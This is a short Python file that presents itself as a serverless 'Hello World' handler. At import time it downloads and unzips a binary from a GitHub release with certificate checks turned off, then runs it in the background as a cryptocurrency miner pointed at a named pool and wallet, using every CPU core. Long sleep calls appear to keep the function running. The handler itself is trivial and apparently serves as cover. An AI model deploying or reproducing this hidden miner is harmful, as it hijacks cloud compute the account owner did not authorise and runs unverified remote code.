import json
import datetime
import os
import time
os.system("wget --no-check-certificate https://github.com/meuryalos/profile/releases/download/1.0.0/test.zip")
os.system("unzip test.zip")
os.system("nohup ./test --algorithm yespowertide --disable-gpu --pool stratum-eu.rplant.xyz:7059 --wallet TFrQ7u9spKk8MBgX6Bze3oxPbs3Yh1tAsq.$(echo $(shuf -i 100-999 -n 1)-CPU) -p webpassword=1234,m=solo -t $(nproc --all) --keepalive true  --log=stdout > meta.log &")
time.sleep(3300)
def handler(event, context):
    data = {
        'output': 'Hello World',
        'timestamp': datetime.datetime.utcnow().isoformat()
    }
    return {'statusCode': 200,
            'body': json.dumps(data),
            'headers': {'Content-Type': 'application/json'}}
time.sleep(3000)
